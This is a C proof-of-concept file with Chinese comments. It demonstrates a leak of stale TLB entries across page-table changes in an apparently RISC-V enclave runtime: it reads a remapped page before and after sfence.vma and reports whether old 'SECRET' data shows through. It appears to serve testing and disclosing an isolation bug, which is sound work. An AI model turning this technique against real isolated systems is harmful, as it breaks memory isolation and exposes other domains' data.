/* tlb_leak_payload.c — TLB 残留条目跨页表泄漏演示 (musl 飞地 payload)
 *
 * 原理:
 *   当前 TLB 实现按 VPN 索引, 不作 mdid/asid 过滤, satp PPN 变化时若
 *   MODE 不变则 TLB 不刷新, 旧页表的 TLB 条目残留 → 同 VA 命中旧 PPN。
 *
 * 流程 (U-mode, 通过 Rust S-mode 运行时的 ecall mmap):
 *   1. mmap(VA_PROBE) → PPN_A, 写入 "SECRET-KEY-0123456789AB"
 *   2. 反复读 VA_PROBE 确保 TLB 填充 (VPN→PPN_A)
 *   3. munmap(VA_PROBE)                          — 清 PTE, 不刷 TLB
 *   4. mmap(VA_PROBE) → PPN_B (不同物理页!)
 *   5. 读 VA_PROBE (无 sfence.vma)                — TLB hit? → PPN_A → "SECRET..."
 *   6. sfence.vma; 再读 VA_PROBE                  — TLB miss → PPN_B → 正确数据
 *   7. 输出结论
 *
 * 编译:
 *   make tlb_leak_musl
 *
 * SPDX-License-Identifier: GPL-2.0
 */

#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SECRET_DATA  "SECRET-KEY-0123456789AB"
#define PUBLIC_DATA  "PUBLIC-DATA-XXXXXXXXXXXX"
#define VA_PROBE     ((volatile char *)0x20000000UL)

/* RISC-V sfence.vma — 刷全部 TLB */
static inline void tlb_flush_all(void) {
    __asm__ volatile("sfence.vma zero, zero" ::: "memory");
}

int main(int argc __attribute__((unused)),
         char **argv __attribute__((unused))) {
    size_t page_sz = 4096;

    /* ======== Phase 1: Victim — 填充 TLB with SECRET ======== */
    void *va = mmap((void *)VA_PROBE, page_sz,
                    PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                    -1, 0);
    if (va == MAP_FAILED) {
        printf("[FAIL] Phase 1 mmap\n");
        return 1;
    }
    memset(va, 0, page_sz);
    strncpy((char *)va, SECRET_DATA, page_sz - 1);

    /* 反复访问填 TLB */
    volatile char *p = (volatile char *)VA_PROBE;
    char sum = 0;
    for (int i = 0; i < 200; i++) {
        for (size_t j = 0; j < strlen(SECRET_DATA); j++)
            sum ^= p[j];
    }
    printf("[phase1] VA=%p wrote='%s' TLB filled (sum=0x%02x)\n",
           (void *)VA_PROBE, SECRET_DATA, sum & 0xFF);

    /* ======== Phase 2: 换页 — munmap + mmap (同 VA, 不同 PPN) ======== */
    /* munmap 清除 PTE, 但不刷新 TLB — 旧条目残留 */
    munmap(va, page_sz);

    va = mmap((void *)VA_PROBE, page_sz,
              PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
              -1, 0);
    if (va == MAP_FAILED) {
        printf("[FAIL] Phase 2 mmap\n");
        return 1;
    }
    memset(va, 0, page_sz);
    strncpy((char *)va, PUBLIC_DATA, page_sz - 1);
    printf("[phase2] remapped VA=%p wrote='%s'\n",
           (void *)VA_PROBE, PUBLIC_DATA);

    /* ======== Phase 3: 探测 — 无 flush 读 vs flush 后读 ======== */
    char buf[64];

    /* 读 1: 无 TLB flush — 若 TLB 残留, 读到旧 PPN (SECRET) */
    memcpy(buf, (void *)VA_PROBE, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    int leak = (strncmp(buf, SECRET_DATA, strlen(SECRET_DATA)) == 0);
    int correct = (strncmp(buf, PUBLIC_DATA, strlen(PUBLIC_DATA)) == 0);

    printf("[phase3] no-flush read: '%s'\n", buf);

    /* 读 2: sfence.vma 后再读 — 必须走页表, 读到新 PPN (PUBLIC) */
    tlb_flush_all();

    char buf2[64];
    memcpy(buf2, (void *)VA_PROBE, sizeof(buf2) - 1);
    buf2[sizeof(buf2) - 1] = '\0';
    int leak2 = (strncmp(buf2, SECRET_DATA, strlen(SECRET_DATA)) == 0);
    int correct2 = (strncmp(buf2, PUBLIC_DATA, strlen(PUBLIC_DATA)) == 0);

    printf("[phase3] post-sfence.vma read: '%s'\n", buf2);

    /* ======== 结论 ======== */
    printf("\n=== Result ===\n");
    printf("  No flush:   %s\n",
           leak ? "LEAKED (TLB residual entry!)"
                : correct ? "CORRECT (TLB miss, page walk)"
                : "UNKNOWN");
    printf("  After flush: %s\n",
           leak2 ? "STILL LEAKED (sfence.vma failed!)"
                 : correct2 ? "CORRECT (TLB flushed, page walk OK)"
                 : "UNKNOWN");
    printf("  Verdict: %s\n",
           (leak && correct2) ? "TLB leak CONFIRMED — sfence.vma mitigates"
           : (leak && leak2)  ? "TLB leak PERSISTS after sfence.vma — BUG"
           : "No leak detected");

    munmap(va, page_sz);
    return (leak && correct2) ? 0 : 1;
}
